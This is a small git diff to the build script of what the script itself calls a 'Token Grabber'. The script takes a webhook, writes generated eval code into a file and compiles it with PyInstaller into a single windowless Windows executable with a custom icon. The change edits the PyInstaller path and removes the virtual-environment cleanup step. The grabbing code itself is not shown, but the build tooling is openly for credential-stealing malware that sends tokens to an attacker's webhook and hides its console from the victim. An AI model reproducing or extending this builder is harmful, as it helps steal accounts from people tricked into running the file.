@@ -58,7 +58,7 @@ def build(webhook: str, out_file: str, debug: bool):
         build_file.write(eval_code)
 
     # Compile command for Windows
-    compile_command = ["venv/Scripts/pyinstaller.exe"]
+    compile_command = ["pyinstaller.exe"]
     compile_command += [of, "--onefile", "--noconsole", "--hidden-import=_cffi_backend", f"--icon={path.join('img', 'exe_file.ico')}"]
     
     if debug:
@@ -112,7 +112,6 @@ def main(args: Namespace):
     print(f"[🏗️] Building the Token Grabber, please wait. . .")
     build(args.webhook, args.filename, args.debug)
     print(f"[🧳] Successfully Built the Grabber!\n")
-    delete_virtual_env()
 
 if __name__ == "__main__":
     main(get_args())
